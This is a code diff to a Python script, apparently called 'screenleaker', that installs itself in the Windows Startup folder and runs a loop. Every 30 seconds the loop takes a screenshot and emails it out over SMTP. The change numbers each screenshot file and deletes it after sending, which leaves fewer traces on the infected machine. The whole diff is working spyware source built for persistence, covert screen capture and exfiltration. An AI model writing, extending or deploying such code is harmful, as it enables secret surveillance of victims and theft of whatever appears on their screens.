@@ -17,11 +17,14 @@ listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\S
 if "screenleaker.exe" not in listapp:
     shutil.copy(src_path, dst_path)
 
+i = 0
 
 while True:
     t.sleep(30)
+    i += 1
     myScreenshot = pyautogui.screenshot()
-    myScreenshot.save(r'./screenshot.png')
+    filename = f'./screenshot_{i}.png'
+    myScreenshot.save(filename)
 
     msg = MIMEMultipart()
 
@@ -47,3 +50,4 @@ while True:
     server.send_message(msg)
     server.quit()
     print("mail sent")
+    os.remove(filename)
